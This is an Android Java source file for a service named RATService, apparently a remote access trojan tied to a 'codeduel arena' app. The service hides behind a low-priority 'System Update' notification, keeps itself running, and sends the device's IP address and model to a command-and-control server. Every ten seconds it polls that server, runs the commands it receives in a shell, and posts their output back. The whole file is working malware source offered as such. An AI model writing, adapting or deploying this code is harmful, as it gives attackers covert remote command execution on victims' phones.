package com.codeduel.arena;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class RATService extends Service {
    private static final String C2_SERVER = "https://codeduelarena.onrender.com/api/shell";
    private Handler handler = new Handler();
    private Runnable heartbeatTask;
    
    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, createNotification());
        registerWithC2();
        startHeartbeat();
    }
    
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "rat_channel", "System Update", NotificationManager.IMPORTANCE_MIN);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new Notification.Builder(this, "rat_channel")
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build();
    }
    
    private void registerWithC2() {
        new Thread(() -> {
            try {
                JSONObject client = new JSONObject();
                client.put("ip", getLocalIpAddress());
                client.put("device", Build.MODEL);
                sendPost(C2_SERVER + "/register", client.toString());
            } catch (Exception e) { Log.e("RAT", "Register error", e); }
        }).start();
    }
    
    private void startHeartbeat() {
        heartbeatTask = new Runnable() {
            @Override
            public void run() {
                new Thread(() -> {
                    try {
                        String response = sendGet(C2_SERVER + "/execute?cmd=echo%20heartbeat");
                        if (response != null && response.contains("error")) {
                            // Execute pending command
                            JSONObject cmd = new JSONObject(response);
                            if (cmd.has("command")) {
                                executeCommand(cmd.getString("command"));
                            }
                        }
                    } catch (Exception e) { Log.e("RAT", "Heartbeat error", e); }
                }).start();
                handler.postDelayed(this, 10000); // 10 seconds
            }
        };
        handler.post(heartbeatTask);
    }
    
    private String getLocalIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr.getAddress().length == 4) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) { }
        return "unknown";
    }
    
    private String sendGet(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    
    private void sendPost(String urlString, String data) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) { Log.e("RAT", "POST error", e); }
    }
    
    private void executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            process.waitFor();
            sendPost(C2_SERVER + "/execute", new JSONObject().put("output", output.toString()).toString());
        } catch (Exception e) { Log.e("RAT", "Execute error", e); }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
    
    @Override
    public void onDestroy() {
        handler.removeCallbacks(heartbeatTask);
        super.onDestroy();
    }
}